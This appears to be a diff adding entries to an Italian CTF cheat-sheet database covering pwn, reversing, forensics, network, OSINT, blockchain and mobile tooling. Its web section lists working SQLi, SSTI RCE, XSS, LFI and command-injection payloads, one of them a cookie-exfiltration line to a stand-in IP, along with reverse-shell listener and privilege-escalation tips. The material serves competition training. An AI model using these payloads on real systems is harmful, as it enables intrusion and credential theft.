+{cat:"pwn",type:"triage",t:"printf(input) senza format",d:"Format string: %p per leakare (canary/libc), %n per scrivere. pwntools: fmtstr_payload.",tags:["format-string","leak"]},
+{cat:"pwn",type:"howto",t:"GOT overwrite",d:"Con Partial RELRO e una primitiva di scrittura, sovrascrivi una entry GOT (es. puts→system) per dirottare una chiamata.",tags:["got","relro"]},
+{cat:"pwn",type:"cmd",t:"one_gadget (shell in un colpo)",d:"Trova indirizzi nella libc che danno shell con un solo salto (se i vincoli sono soddisfatti).",cmd:"one_gadget ./libc.so.6",tags:["one-gadget","libc"]},
+{cat:"pwn",type:"cmd",t:"Aggancia la libc fornita",d:"Se ti danno una libc, patcha il binario o gli offset saranno sbagliati.",cmd:"pwninit    # oppure: patchelf --replace-needed libc.so.6 ./libc.so.6 ./chall",tags:["libc","pwninit","patchelf"]},
+{cat:"pwn",type:"howto",t:"Heap exploitation: orientarsi",d:"Sfide con menu malloc/free. Bug tipici: UAF, double free, heap overflow. vendor/how2heap ha un esempio compilabile per tecnica, diviso per versione glibc (dalla 2.32 c'è il safe-linking).",tags:["heap","how2heap","uaf"]},
+{cat:"pwn",type:"triage",t:"Filtro seccomp attivo",d:"Niente shell: resta spesso open/read/write (ORW) per leggere il flag.",cmd:"seccomp-tools dump ./chall",tags:["seccomp","orw"]},
+{cat:"pwn",type:"cmd",t:"Template exploit (pwntools)",d:"Scaffold locale/remoto/gdb già pronto.",cmd:"cp templates/pwn_remote.py work/chall/solve.py",op:[
+ {o:"process()",d:"esegue il binario in locale"},
+ {o:"remote(h,p)",d:"si connette al server",e:"io=remote('t',1337)"},
+ {o:"gdb.debug()",d:"avvia sotto gdb"},
+ {o:"p.sendline()",d:"invia dati + newline"},
+ {o:"p.recvuntil(x)",d:"leggi finché compare x"},
+ {o:"cyclic / cyclic_find",d:"pattern e offset"},
+ {o:"ELF()",d:"parsa simboli/GOT del binario",e:"e=ELF('./chall')"},
+ {o:"ROP()",d:"costruttore di catene ROP"},
+ {o:"p64() / u64()",d:"pack/unpack little-endian"}
+],tags:["pwntools","template"]},
+{cat:"pwn",type:"howto",t:"Debug con gdb+pwndbg",d:"Comandi chiave: 'b *0x..' breakpoint, 'vmmap' memoria, 'telescope $rsp' stack, 'checksec', 'find' per cercare valori.",tags:["gdb","pwndbg","debug"]},
+
+/* ============ REVERSE ============ */
+{cat:"rev",type:"howto",t:"Cos'è il reverse engineering",d:"Capire cosa fa un programma senza sorgente, per trovare l'input/flag giusto. Un decompilatore rilegge il codice e la logica del check.",tags:["reverse","basics"]},
+{cat:"rev",type:"cmd",t:"Prima occhiata",d:"Stringhe, simboli, messaggi Correct/Wrong: puntano alla funzione chiave.",cmd:"file ./chall; strings ./chall | grep -iE 'flag|correct|wrong'; nm -C ./chall 2>/dev/null | grep -i check",tags:["strings","nm","recon"]},
+{cat:"rev",type:"cmd",t:"Traccia chiamate a runtime",d:"ltrace mostra le chiamate a libreria (strcmp col flag!), strace le syscall.",cmd:"ltrace ./chall; strace -f ./chall",op:[
+ {o:"-f",d:"segui i processi figli"},
+ {o:"-e",d:"filtra le chiamate",e:"strace -e openat ./chall"},
+ {o:"-s",d:"lunghezza stringhe mostrate",e:"-s 200"},
+ {o:"-o",d:"salva su file",e:"-o trace.txt"},
+ {o:"-p",d:"attacca a un PID in esecuzione"}
+],tags:["ltrace","strace","dynamic"]},
+{cat:"rev",type:"howto",t:"Ghidra: il decompilatore gratis",d:"Apri il binario, lascia analizzare, doppio clic su main: pseudo-C leggibile. Cerca la funzione che confronta l'input col valore atteso.",cmd:"ghidraRun",tags:["ghidra","decompile"]},
+{cat:"rev",type:"cmd",t:"radare2 / rizin",d:"Analisi veloce da CLI: funzioni e disassembly di main.",cmd:"r2 -A ./chall",op:[
+ {o:"-A",d:"analizza tutto all'avvio"},
+ {o:"-d",d:"modalità debug",e:"r2 -d ./chall"},
+ {o:"aaa",d:"analisi approfondita (dentro r2)"},
+ {o:"afl",d:"lista funzioni"},
+ {o:"pdf @ main",d:"disassembla una funzione"},
+ {o:"VV",d:"vista a grafo"},
+ {o:"iz / izz",d:"stringhe nel data / in tutto il file"}
+],tags:["radare2","disasm"]},
+{cat:"rev",type:"howto",t:"angr: risolvere simbolicamente",d:"Dici 'raggiungi l'indirizzo del Correct, evita il Wrong' e angr trova l'input. Ottimo per keygen/validatori.",cmd:"cp templates/angr_find.py work/chall/solve.py",tags:["angr","symbolic"]},
+{cat:"rev",type:"cmd",t:"z3: inverti i vincoli",d:"Se il check è una serie di equazioni sui caratteri, z3 le risolve.",cmd:"cp templates/solve_z3.py work/chall/solve.py",tags:["z3","constraints"]},
+{cat:"rev",type:"cmd",t:"FLOSS: stringhe offuscate",d:"Come strings ma estrae anche stringhe decodificate/impilate che strings non vede.",cmd:"floss ./chall",tags:["floss","strings","obfuscation"]},
+{cat:"rev",type:"triage",t:"Python compilato (.pyc)",d:"Decompila: pycdc (o decompyle3/uncompyle6 per versioni vecchie).",cmd:"pycdc file.pyc",tags:["python","pyc"]},
+{cat:"rev",type:"triage",t:"Eseguibile .NET",d:"Decompila quasi all'originale con dnSpy o ILSpy.",tags:["dotnet","dnspy"]},
+{cat:"rev",type:"triage",t:"File .jar/.class (Java)",d:"Decompila con CFR, procyon o jd-gui.",cmd:"java -jar cfr.jar app.jar > src.java",tags:["java","jar"]},
+{cat:"rev",type:"triage",t:"Binario packed (UPX)",d:"Compresso: scompatta e rianalizza.",cmd:"upx -d ./chall",tags:["upx","packed"]},
+{cat:"rev",type:"howto",t:"Anti-debug",d:"Il binario rileva il debugger. Soluzioni: patchare i salti (NOP) o risolvere staticamente in Ghidra ignorando il controllo.",tags:["anti-debug","patch"]},
+
+/* ============ FORENSICS / STEGO ============ */
+{cat:"for",type:"howto",t:"Come approcciare una forensics",d:"Identifica il vero tipo, cerca dati annidati o metadati, estrai, ripeti sui pezzi. Lavora su copie in cartella dedicata.",tags:["forensics","metodo"]},
+{cat:"for",type:"cmd",t:"Trio di apertura",d:"Quasi sempre il primo passo.",cmd:"file f; exiftool f; binwalk f",tags:["file","exiftool","binwalk"]},
+{cat:"for",type:"cmd",t:"binwalk: analisi e estrazione",d:"Trova e estrae file incorporati, firmware, archivi.",cmd:"binwalk -e f",op:[
+ {o:"(nessuna)",d:"scansione: elenca cosa c'è dentro",e:"binwalk f"},
+ {o:"-e",d:"estrai gli oggetti trovati"},
+ {o:"-M",d:"estrazione ricorsiva (matryoshka)"},
+ {o:"--dd",d:"estrai per tipo specifico",e:"--dd='png:png'"},
+ {o:"-A",d:"cerca opcode/architetture"},
+ {o:"-E",d:"analisi di entropia (dati cifrati/compressi)"}
+],tags:["binwalk","carving"]},
+{cat:"for",type:"cmd",t:"Carving file (foremost)",d:"Recupera file per magic bytes quando binwalk non basta.",cmd:"foremost -i f -o out/",op:[
+ {o:"-i",d:"file di input"},
+ {o:"-o",d:"cartella di output (deve essere vuota)"},
+ {o:"-t",d:"tipi da cercare",e:"-t jpg,pdf,zip"},
+ {o:"-v",d:"verbose"}
+],tags:["foremost","carving"]},
+{cat:"for",type:"cmd",t:"exiftool: metadati",d:"Legge/scrive metadati di qualunque file: spesso il flag o un indizio GPS.",cmd:"exiftool -a -G1 f",op:[
+ {o:"-a",d:"mostra anche tag duplicati"},
+ {o:"-G1",d:"mostra il gruppo di ogni tag"},
+ {o:"-u",d:"mostra tag sconosciuti"},
+ {o:"-b",d:"output binario (estrai un campo)",e:"exiftool -b -ThumbnailImage f > t.jpg"},
+ {o:"-TAG",d:"leggi un tag specifico",e:"exiftool -GPSPosition f"},
+ {o:"-all=",d:"rimuove tutti i metadati"}
+],tags:["exiftool","metadata","gps"]},
+{cat:"for",type:"cmd",t:"Magic bytes / header",d:"Se header corrotto o cambiato, riparalo confrontando con un file sano.",cmd:"xxd f | head",how:"PNG inizia con 89 50 4E 47. JPG con FF D8 FF. ZIP con 50 4B. PDF con 25 50 44 46. Correggi i primi byte con un editor esadecimale.",tags:["magic-bytes","repair","hex"]},
+{cat:"for",type:"cmd",t:"PNG: verifica integrità",d:"pngcheck rivela chunk corrotti, dimensioni falsate (flag nascosto oltre l'immagine visibile).",cmd:"pngcheck -vtp7 img.png",tags:["png","pngcheck","repair"]},
+{cat:"for",type:"howto",t:"Stego immagini: dove guardare",d:"LSB, canali/piani di bit separati, dati dopo l'IEND, roba protetta da password. Prova gli strumenti in ordine.",tags:["stego","image"]},
+{cat:"for",type:"cmd",t:"Stego LSB (zsteg)",d:"Rileva LSB e piani di bit su PNG/BMP.",cmd:"zsteg -a img.png",op:[
+ {o:"-a",d:"prova tutti i metodi noti"},
+ {o:"-E",d:"estrai un payload specifico",e:"zsteg -E 'b1,rgb,lsb' img.png"},
+ {o:"(file)",d:"analisi base",e:"zsteg img.png"}
+],tags:["stego","zsteg","lsb"]},
+{cat:"for",type:"cmd",t:"Stego con password (steghide/stegseek)",d:"Estrae da JPG/WAV. stegseek fa il brute velocissimo con rockyou.",cmd:"stegseek img.jpg rockyou.txt    # oppure: steghide extract -sf img.jpg",op:[
+ {o:"extract -sf",d:"estrai (steghide) dal file",e:"steghide extract -sf img.jpg"},
+ {o:"-p",d:"password",e:"steghide extract -sf i.jpg -p pass"},
+ {o:"info -sf",d:"info sul file stego"},
+ {o:"stegseek f wl",d:"brute della passphrase",e:"stegseek i.jpg rockyou.txt"}
+],tags:["stego","steghide","stegseek"]},
+{cat:"for",type:"cmd",t:"Ispezione visiva (stegsolve)",d:"GUI per scorrere piani di bit e canali: a volte il flag appare a occhio.",cmd:"java -jar stegsolve.jar",tags:["stego","stegsolve"]},
+{cat:"for",type:"cmd",t:"Archivio protetto",d:"Estrai l'hash e craccalo con john.",cmd:"zip2john file.zip > h.txt; john --wordlist=rockyou.txt h.txt",how:"Varianti: rar2john, 7z2john, pdf2john, ssh2john, office2john, keepass2john.",tags:["zip","john","crack"]},
+{cat:"for",type:"howto",t:"Memory dump (Volatility3)",d:"Dump RAM: processi, comandi, password, file. Parti da pslist/cmdline, cerca il flag con filescan/dumpfiles.",cmd:"vol -f dump.raw windows.pslist",op:[
+ {o:"-f",d:"file dump"},
+ {o:"windows.pslist",d:"processi attivi"},
+ {o:"windows.cmdline",d:"argomenti dei processi"},
+ {o:"windows.filescan",d:"file in memoria",e:"...filescan | grep flag"},
+ {o:"windows.dumpfiles",d:"estrai un file",e:"--virtaddr 0x.."},
+ {o:"windows.hashdump",d:"hash degli account"},
+ {o:"-o",d:"cartella di output"}
+],tags:["volatility","memory"]},
+{cat:"for",type:"triage",t:"Documento Office con macro",d:"Analizza le macro VBA (spesso offuscate) con oletools.",cmd:"olevba documento.docm",tags:["office","macro","olevba"]},
+{cat:"for",type:"triage",t:"File audio",d:"Spettrogramma (Audacity/Sonic Visualiser) per testo nascosto. Oppure DTMF/SSTV/Morse.",tags:["audio","spectrogram","sstv"]},
+{cat:"for",type:"triage",t:"Disco / filesystem",d:"Monta in loop o recupera cancellati con testdisk/photorec.",cmd:"testdisk disk.img",tags:["disk","recovery"]},
+{cat:"for",type:"cmd",t:"QR / barcode",d:"Decodifica codici da immagine.",cmd:"zbarimg img.png",tags:["qr","barcode","zbar"]},
+
+/* ============ NETWORK / RECON ============ */
+{cat:"net",type:"cmd",t:"nmap: scansione host/porte",d:"Scopre porte aperte, servizi e versioni di un host: base del recon di rete.",cmd:"nmap -sC -sV -p- target",op:[
+ {o:"-sV",d:"rileva versione dei servizi"},
+ {o:"-sC",d:"esegue gli script di default (NSE)"},
+ {o:"-p-",d:"tutte le 65535 porte",e:"-p- oppure -p 80,443"},
+ {o:"-p",d:"porte specifiche",e:"-p 22,80,8080"},
+ {o:"-A",d:"aggressivo (OS+versioni+script+traceroute)"},
+ {o:"-sS",d:"SYN scan (serve root, veloce)"},
+ {o:"-sU",d:"scan UDP"},
+ {o:"-Pn",d:"salta il ping (host che non risponde a ping)"},
+ {o:"-T4",d:"velocità (0 lento … 5 veloce)"},
+ {o:"-oN/-oA",d:"salva output",e:"-oA scan"},
+ {o:"--script",d:"script NSE specifici",e:"--script vuln"},
+ {o:"-sn",d:"solo ping sweep (scopri host vivi)"}
+],tags:["nmap","recon","scan","porte"]},
+{cat:"net",type:"howto",t:"Analizzare un pcap",d:"Cattura di traffico: capisci i protocolli, segui lo stream giusto, estrai file/credenziali/esfiltrazioni. Wireshark (GUI) e tshark (CLI).",tags:["pcap","network"]},
+{cat:"net",type:"cmd",t:"capinfos: panoramica pcap",d:"Durata, numero pacchetti, host.",cmd:"capinfos cap.pcap",tags:["pcap","capinfos"]},
+{cat:"net",type:"cmd",t:"tshark: analisi pcap da CLI",d:"Il Wireshark da terminale: filtra, estrae campi, segue stream.",cmd:"tshark -r cap.pcap -q -z io,phs",op:[
+ {o:"-r",d:"leggi da file pcap"},
+ {o:"-Y",d:"filtro di visualizzazione (display filter)",e:"-Y 'http.request'"},
+ {o:"-T fields -e",d:"estrai campi specifici",e:"-T fields -e ip.src -e dns.qry.name"},
+ {o:"-z io,phs",d:"gerarchia protocolli (cosa c'è dentro)"},
+ {o:"-z conv,tcp",d:"conversazioni TCP"},
+ {o:"-z follow,tcp,ascii,0",d:"segui lo stream n.0"},
+ {o:"--export-objects",d:"estrai file",e:"--export-objects http,./out"},
+ {o:"-c",d:"leggi solo N pacchetti"},
+ {o:"-x",d:"hex dump dei pacchetti"}
+],tags:["pcap","tshark","filter"]},
+{cat:"net",type:"cmd",t:"Segui uno stream TCP",d:"Ricostruisce lo scambio: spesso il flag è qui. GUI: destro → Follow → TCP Stream.",cmd:"tshark -r cap.pcap -z follow,tcp,ascii,0",tags:["pcap","stream"]},
+{cat:"net",type:"cmd",t:"Estrai file dal pcap",d:"Oggetti scaricati via HTTP/SMB/TFTP, poi forensics.",cmd:"tshark -r cap.pcap --export-objects http,./out_http",tags:["pcap","export"]},
+{cat:"net",type:"cmd",t:"Credenziali in chiaro",d:"POST HTTP e comandi FTP/Telnet.",cmd:"tshark -r cap.pcap -Y 'http.request.method==POST' -T fields -e http.file_data",tags:["pcap","creds"]},
+{cat:"net",type:"triage",t:"Tante query DNS strane",d:"DNS exfiltration: dati nei sottodomini (hex/base64). Estrai, concatena, decodifica.",cmd:"tshark -r cap.pcap -Y dns -T fields -e dns.qry.name | sort -u",tags:["dns","exfil"]},
+{cat:"net",type:"triage",t:"ICMP con payload grossi",d:"Esfiltrazione nel campo data dei ping.",cmd:"tshark -r cap.pcap -Y icmp -T fields -e data",tags:["icmp","exfil"]},
+{cat:"net",type:"howto",t:"USB catturato: tastiera (HID)",d:"usb.capdata = tastiera registrata: ogni pacchetto è un tasto. Estrai gli scancode e mappali con uno script (./search.sh 'usb keystroke').",cmd:"tshark -r cap.pcap -Y 'usb.capdata' -T fields -e usb.capdata > hid.txt",tags:["usb","hid","keystroke"]},
+{cat:"net",type:"triage",t:"Traffico TLS cifrato",d:"Serve la chiave: cerca un .key o SSLKEYLOG fornito e caricalo in Wireshark (Preferences→TLS→keylog).",tags:["tls","decrypt"]},
+{cat:"net",type:"triage",t:"Handshake WiFi (WPA)",d:"Cattura 802.11 con handshake: craccalo con wordlist.",cmd:"aircrack-ng cap.pcap -w rockyou.txt",op:[
+ {o:"-w",d:"wordlist per il crack WPA"},
+ {o:"-b",d:"BSSID del target",e:"-b AA:BB:CC:.."},
+ {o:"-e",d:"ESSID (nome rete)"}
+],tags:["wifi","wpa","aircrack"]},
+{cat:"net",type:"cmd",t:"tcpdump: cattura al volo",d:"Cattura traffico dal vivo su un'interfaccia (quando serve generarlo tu).",cmd:"tcpdump -i eth0 -w out.pcap",op:[
+ {o:"-i",d:"interfaccia",e:"-i eth0"},
+ {o:"-w",d:"scrivi su pcap"},
+ {o:"-r",d:"leggi da pcap"},
+ {o:"-n",d:"non risolvere i nomi"},
+ {o:"-A",d:"mostra payload ASCII"},
+ {o:"'port 80'",d:"filtro BPF",e:"tcpdump 'tcp port 80'"}
+],tags:["tcpdump","capture"]},
+{cat:"net",type:"cmd",t:"NetworkMiner (auto-estrazione)",d:"GUI che da un pcap tira fuori file, immagini, credenziali e host da sola.",cmd:"mono NetworkMiner.exe cap.pcap",tags:["pcap","networkminer"]},
+
+/* ============ OSINT ============ */
+{cat:"osint",type:"howto",t:"Come approcciare l'OSINT",d:"Parti dal dato (username, foto, email, dominio, coordinate) e cerca SOLO su fonti pubbliche per ricostruire un'informazione collegata.",tags:["osint","metodo"]},
+{cat:"osint",type:"cmd",t:"Metadati di un'immagine",d:"Autore, software, data e soprattutto GPS: spesso il punto di partenza.",cmd:"exiftool -a -G1 foto.jpg",tags:["osint","exiftool","gps"]},
+{cat:"osint",type:"howto",t:"Reverse image search",d:"Carica su Google Images/Yandex/TinEye per trovarne origine o luogo. Yandex è spesso il migliore su volti e luoghi.",tags:["osint","reverse-image"]},
+{cat:"osint",type:"cmd",t:"Info dominio e DNS",d:"Registrante, IP, mail server, TXT (spesso con indizi).",cmd:"whois target.com; dig +short target.com ANY; dig txt target.com",tags:["osint","whois","dns"]},
+{cat:"osint",type:"howto",t:"Certificati e sottodomini",d:"crt.sh elenca i certificati emessi (rivela sottodomini). Wayback Machine mostra versioni vecchie del sito.",tags:["osint","crt","subdomain"]},
+{cat:"osint",type:"howto",t:"Username cross-piattaforma",d:"Un username è spesso riusato ovunque. Sherlock lo cerca su centinaia di siti (serve rete; offline, cerca a mano i principali).",tags:["osint","username","sherlock"]},
+{cat:"osint",type:"howto",t:"Geolocalizzazione da foto",d:"Senza GPS: cerca indizi (insegne, lingua, targhe, architettura, ombre) e incrocia con mappe/Street View.",tags:["osint","geoint"]},
+
+/* ============ MISC ============ */
+{cat:"misc",type:"cmd",t:"Encoding a catena (CyberChef)",d:"Apri CyberChef offline e trascina 'Magic': riconosce e sbroglia catene.",cmd:"xdg-open vendor/cyberchef/CyberChef_v*.html",tags:["encoding","cyberchef"]},
+{cat:"misc",type:"cmd",t:"Client interattivo (automazione)",d:"Per server che chiedono molti calcoli o un proof-of-work.",cmd:"cp templates/nc_client.py work/chall/solve.py",tags:["nc","automation","template"]},
+{cat:"misc",type:"cmd",t:"Connessione manuale",d:"Collegati a un servizio di sfida per vedere cosa chiede.",cmd:"nc host port",tags:["nc","connect"]},
+{cat:"misc",type:"howto",t:"Proof of Work (PoW)",d:"Il server chiede: 'trova X tale che sha256(prefix+X) inizi con N zeri'. Cicli X finché il digest combacia e lo invii.",tags:["pow","hashcash"]},
+{cat:"misc",type:"howto",t:"Pyjail / sandbox escape",d:"Prompt Python con filtri. Si evade via __class__/__bases__/__subclasses__ o import alternativi. Payload in vendor/hacktricks.",tags:["pyjail","sandbox"]},
+{cat:"misc",type:"howto",t:"Challenge di programmazione",d:"Server che pone centinaia di quesiti a tempo. Non a mano: parsa e rispondi via script (pwntools recvuntil/sendline).",tags:["programming","automation"]},
+{cat:"misc",type:"howto",t:"Linguaggi esoterici",d:"Brainfuck (solo +-<>[].,), Ook, Malbolge, Whitespace (solo spazi/tab): riconoscili e usa un interprete o CyberChef.",tags:["esoteric","brainfuck","whitespace"]},
+
+/* ============ BLOCKCHAIN ============ */
+{cat:"bc",type:"howto",t:"Blockchain in CTF",d:"Quasi sempre un contratto Solidity con sorgente + endpoint. Obiettivo: isSolved()==true o svuotare il contratto.",tags:["blockchain","solidity"]},
+{cat:"bc",type:"triage",t:"Cosa cercare in un contratto Solidity",d:"reentrancy, tx.origin, overflow (<0.8), delegatecall controllabile, funzioni senza access control, 'segreti' nello storage.",tags:["solidity","audit"]},
+{cat:"bc",type:"howto",t:"Lo storage non è segreto",d:"Le variabili 'private' sono comunque leggibili on-chain. Si leggono con getStorageAt.",tags:["solidity","storage"]},
+{cat:"bc",type:"cmd",t:"Interagire (cast/foundry)",d:"Chiama funzioni e invia transazioni.",cmd:"cast call ADDR 'isSolved()(bool)' --rpc-url URL",op:[
+ {o:"call",d:"chiamata in sola lettura"},
+ {o:"send",d:"transazione che modifica stato",e:"cast send ADDR 'solve()' --private-key K"},
+ {o:"storage",d:"leggi uno slot di storage",e:"cast storage ADDR 0"},
+ {o:"--rpc-url",d:"endpoint del nodo"},
+ {o:"--private-key",d:"chiave per firmare"}
+],tags:["web3","foundry","cast"]},
+
+/* ============ MOBILE ============ */
+{cat:"mob",type:"howto",t:"APK Android: da dove partire",d:"Un APK è uno zip. Decompila in Java/smali e cerca stringhe, chiavi, logica del check. jadx dà il Java più leggibile.",cmd:"jadx -d out/ app.apk",op:[
+ {o:"-d",d:"cartella di output"},
+ {o:"--deobf",d:"deoffusca i nomi"},
+ {o:"-e",d:"esporta come progetto Gradle"},
+ {o:"jadx-gui",d:"versione grafica, comoda per navigare"}
+],tags:["android","apk","jadx"]},
+{cat:"mob",type:"cmd",t:"APK: stringhe e segreti",d:"Flag/chiavi/URL spesso hardcoded nelle risorse o nel codice.",cmd:"unzip -o app.apk -d apk/; grep -rniE 'flag|http|secret|key' apk/",tags:["android","apk","strings"]},
+{cat:"mob",type:"cmd",t:"APK: smali (apktool)",d:"Decodifica risorse e smali, utile per patchare e ri-firmare.",cmd:"apktool d app.apk -o apk_src/",op:[
+ {o:"d",d:"decodifica l'APK"},
+ {o:"b",d:"ricompila dopo le modifiche",e:"apktool b apk_src -o new.apk"},
+ {o:"-r",d:"non decodificare le risorse"},
+ {o:"-s",d:"non decodificare il dex (smali)"}
+],tags:["android","apktool","smali"]},
+
+/* ============ UTILITÀ / AMBIENTE ============ */
+{cat:"util",type:"cmd",t:"Ricerca su tutto il kit",d:"Il comando che apri per primo quando sei bloccato.",cmd:"./search.sh \"<termine>\"",tags:["search","ripgrep"]},
+{cat:"util",type:"cmd",t:"grep: cerca testo ovunque",d:"Trova stringhe in file e cartelle (flag, chiavi, funzioni).",cmd:"grep -rniE 'flag\\{|password' .",op:[
+ {o:"-r",d:"ricorsivo nelle sottocartelle"},
+ {o:"-n",d:"mostra il numero di riga"},
+ {o:"-i",d:"ignora maiuscole/minuscole"},
+ {o:"-E",d:"regex estese (|, +, ?)"},
+ {o:"-l",d:"solo i nomi dei file che matchano"},
+ {o:"-o",d:"stampa solo la parte che matcha"},
+ {o:"-a",d:"tratta i binari come testo"},
+ {o:"-C",d:"righe di contesto",e:"grep -C3 flag f"}
+],tags:["grep","search"]},
+{cat:"util",type:"cmd",t:"find: cerca file",d:"Trova file per nome, permessi, dimensione, data.",cmd:"find / -name '*.txt' 2>/dev/null",op:[
+ {o:"-name",d:"per nome (con wildcard)",e:"-name '*.bak'"},
+ {o:"-iname",d:"come -name ma case-insensitive"},
+ {o:"-perm",d:"per permessi",e:"-perm -4000 (SUID)"},
+ {o:"-type",d:"tipo (f file, d dir)"},
+ {o:"-size",d:"per dimensione",e:"-size +1M"},
+ {o:"-exec",d:"esegui un comando sui risultati",e:"-exec grep flag {} +"},
+ {o:"-newer",d:"più recenti di un file"}
+],tags:["find","search","privesc"]},
+{cat:"util",type:"cmd",t:"strings: testo nei binari",d:"Estrae sequenze stampabili da un file binario.",cmd:"strings -n6 f",op:[
+ {o:"-n",d:"lunghezza minima",e:"-n 8"},
+ {o:"-e",d:"codifica (l=16bit LE, utile per UTF-16)",e:"strings -e l f"},
+ {o:"-t",d:"mostra l'offset",e:"-t x f"},
+ {o:"-a",d:"scansiona tutto il file"}
+],tags:["strings","binary"]},
+{cat:"util",type:"cmd",t:"Attiva l'ambiente Python",d:"Da rifare in ogni nuovo terminale, altrimenti mancano pwntools/angr/z3.",cmd:"source .venv/bin/activate",tags:["venv","python"]},
+{cat:"util",type:"cmd",t:"Verifica i tool pesanti",d:"Controlla che l'ambiente sia a posto prima della gara.",cmd:"python3 -c 'import pwn, angr, z3; print(\"ok\")'",tags:["venv","check"]},
+{cat:"util",type:"cmd",t:"Server HTTP veloce",d:"Per ricevere file/callback (XSS, SSRF) o servire un payload.",cmd:"python3 -m http.server 8000",tags:["http","listener","server"]},
+{cat:"util",type:"cmd",t:"Listener (netcat)",d:"Resta in ascolto di una connessione in entrata (reverse shell).",cmd:"nc -lvnp 4444",op:[
+ {o:"-l",d:"ascolto (listen)"},
+ {o:"-v",d:"verbose"},
+ {o:"-n",d:"niente DNS"},
+ {o:"-p",d:"porta"},
+ {o:"-e",d:"esegui un programma alla connessione (se supportato)"}
+],tags:["netcat","listener","shell"]},
+{cat:"util",type:"howto",t:"Upgrade di una shell 'muta'",d:"Dopo una reverse shell grezza, rendila interattiva: 'python3 -c \"import pty;pty.spawn(\\'/bin/bash\\')\"', poi Ctrl-Z, 'stty raw -echo; fg', 'export TERM=xterm'.",tags:["shell","tty","upgrade"]},
+{cat:"util",type:"howto",t:"GTFOBins / LOLBAS",d:"Binario SUID/sudo (Linux) o LOLBin (Windows)? GTFOBins e LOLBAS dicono come abusarne per leggere file o avere shell.",tags:["gtfobins","lolbas","privesc"]},
+{cat:"util",type:"cmd",t:"Binari SUID (privesc Linux)",d:"Binari con SUID potenzialmente sfruttabili via GTFOBins.",cmd:"find / -perm -4000 -type f 2>/dev/null",tags:["suid","privesc","linux"]},
+
+/* ============ WEB — PAYLOAD PRONTI ============ */
+{cat:"web",type:"cmd",t:"SQLi: payload bypass login",d:"Da provare nel campo user/password per aggirare l'autenticazione.",oplabel:"payload",op:[
+ {o:"' OR '1'='1",d:"condizione sempre vera classica"},
+ {o:"' OR 1=1-- -",d:"commenta il resto della query"},
+ {o:"admin'-- -",d:"logga come admin ignorando la password"},
+ {o:"' OR '1'='1'#",d:"commento stile MySQL"},
+ {o:"\" OR \"1\"=\"1",d:"variante con doppi apici"},
+ {o:"') OR ('1'='1",d:"se l'input è tra parentesi"},
+ {o:"' UNION SELECT 1,2,3-- -",d:"trova il numero di colonne / punti di output"}
+],tags:["sqli","payload","bypass","web"]},
+{cat:"web",type:"cmd",t:"SSTI: payload per engine",d:"Dopo {{7*7}}=49, usa il payload giusto per l'engine identificato.",oplabel:"payload",op:[
+ {o:"{{7*7}}",d:"test generico (Jinja2/Twig) → 49 = vulnerabile"},
+ {o:"${7*7}",d:"test (Freemarker/Java EL)"},
+ {o:"<%= 7*7 %>",d:"test (ERB/Ruby)"},
+ {o:"{{config}}",d:"Jinja2: dump configurazione Flask"},
+ {o:"{{ ''.__class__.__mro__ }}",d:"Jinja2: parti per arrivare a RCE"},
+ {o:"{{cycler.__init__.__globals__.os.popen('id').read()}}",d:"Jinja2: RCE tipica"},
+ {o:"{php}system('id'){/php}",d:"Smarty: RCE"}
+],tags:["ssti","payload","rce","web"]},
+{cat:"web",type:"cmd",t:"XSS: payload comuni",d:"Per riflessi, filtri e contesti diversi; con bot admin servono a rubare il cookie.",oplabel:"payload",op:[
+ {o:"<script>alert(1)<\/script>",d:"test base"},
+ {o:"<img src=x onerror=alert(1)>",d:"senza tag script"},
+ {o:"<svg onload=alert(1)>",d:"vettore SVG"},
+ {o:"\"><script>alert(1)<\/script>",d:"esci da un attributo"},
+ {o:"<script>fetch('http://IP:8000/'+document.cookie)<\/script>",d:"esfiltra cookie"},
+ {o:"javascript:alert(1)",d:"in contesti href/URL"}
+],tags:["xss","payload","web","cookie"]},
+{cat:"web",type:"cmd",t:"LFI: wrapper e path utili",d:"Per leggere file o sorgenti via inclusione locale.",oplabel:"payload",op:[
+ {o:"../../../../etc/passwd",d:"traversal classico"},
+ {o:"....//....//etc/passwd",d:"bypass di filtri che tolgono ../"},
+ {o:"php://filter/convert.base64-encode/resource=index.php",d:"leggi sorgente PHP in base64"},
+ {o:"php://filter/read=string.rot13/resource=x.php",d:"variante rot13"},
+ {o:"data://text/plain;base64,PD9waHA...",d:"esecuzione via data wrapper"},
+ {o:"/proc/self/environ",d:"a volte include-abile"},
+ {o:"expect://id",d:"RCE se wrapper expect attivo"}
+],tags:["lfi","payload","php","web"]},
+{cat:"web",type:"cmd",t:"Command injection: separatori",d:"Per concatenare un comando a un input che finisce in shell.",oplabel:"payload",op:[
+ {o:"; id",d:"separatore di comando"},
+ {o:"| id",d:"pipe"},
+ {o:"&& id",d:"esegui se il primo riesce"},
+ {o:"|| id",d:"esegui se il primo fallisce"},
+ {o:"$(id)",d:"command substitution"},
+ {o:"`id`",d:"substitution con backtick"},
+ {o:"%0a id",d:"newline URL-encoded (bypass filtri)"}
+],tags:["command-injection","payload","rce","web"]},
+
+/* ============ PWN — CASISTICHE AVANZATE ============ */
+{cat:"pwn",type:"howto",t:"Leak + base: la strategia ASLR",d:"Con PIE/ASLR gli indirizzi cambiano ogni run. Prima trapeli un indirizzo noto (da GOT, stack, format string), poi sottrai l'offset statico per ricavare la base, infine calcoli gli indirizzi reali di gadget/funzioni.",tags:["aslr","pie","leak","pwn"]},
+{cat:"pwn",type:"howto",t:"ret2csu",d:"Quando mancano gadget per popolare rdx/rsi (3° e 2° argomento), usi i gadget universali in __libc_csu_init presenti in quasi ogni binario dinamico per controllarli.",tags:["ret2csu","rop","pwn"]},
+{cat:"pwn",type:"howto",t:"SROP (sigreturn)",d:"Con un gadget syscall e il controllo dello stack, forgi un sigcontext falso: la sigreturn ripristina TUTTI i registri a tuo piacimento. Utile quando i gadget scarseggiano.",tags:["srop","sigreturn","pwn"]},
+{cat:"pwn",type:"howto",t:"Stack pivot",d:"Se il buffer è troppo corto per la catena ROP, sposti rsp verso una zona che controlli (es. heap/bss) con 'leave; ret' o 'xchg rax,rsp', e lì metti la catena completa.",tags:["stack-pivot","rop","pwn"]},
+{cat:"pwn",type:"cmd",t:"Shellcode con pwntools",d:"Genera shellcode pronto per l'architettura (quando NX è disattivo).",cmd:"python3 -c \"from pwn import *; context.arch='amd64'; print(shellcraft.sh())\"",how:"Assembla con asm(shellcraft.sh()). Per ORW (seccomp): shellcraft.open/read/write verso il file del flag.",tags:["shellcode","pwntools","shellcraft","pwn"]},
+
+/* ============ RIFERIMENTI (tabelle) ============ */
